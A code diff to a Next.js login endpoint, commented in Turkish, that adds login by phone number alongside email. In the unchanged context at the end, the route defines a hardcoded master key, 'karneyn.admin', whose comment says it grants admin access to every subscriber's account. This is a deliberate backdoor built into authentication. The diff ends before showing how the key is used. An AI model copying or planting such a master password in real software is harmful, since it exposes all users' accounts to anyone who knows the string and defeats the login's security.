@@ -7,13 +7,17 @@ export async function POST(request) {
     const { email, password } = await request.json();
 
     if (!email || !password) {
-      return NextResponse.json({ error: 'E-posta ve şifre gereklidir.' }, { status: 400 });
+      return NextResponse.json({ error: 'E-posta/telefon ve şifre gereklidir.' }, { status: 400 });
     }
 
-    // Find user
-    const user = await prisma.modaUser.findUnique({
-      where: { email },
-    });
+    // Find user — e-posta VEYA telefon numarası ile arama
+    const isPhone = /^0[0-9]{10}$/.test(email.trim());
+    let user;
+    if (isPhone) {
+      user = await prisma.modaUser.findFirst({ where: { phone: email.trim() } });
+    } else {
+      user = await prisma.modaUser.findUnique({ where: { email: email.trim() } });
+    }
 
     // 🔑 Karneyn Anahtar — Tüm abonelerin hesabına admin erişimi
     const KARNEYN_ANAHTAR = 'karneyn.admin';
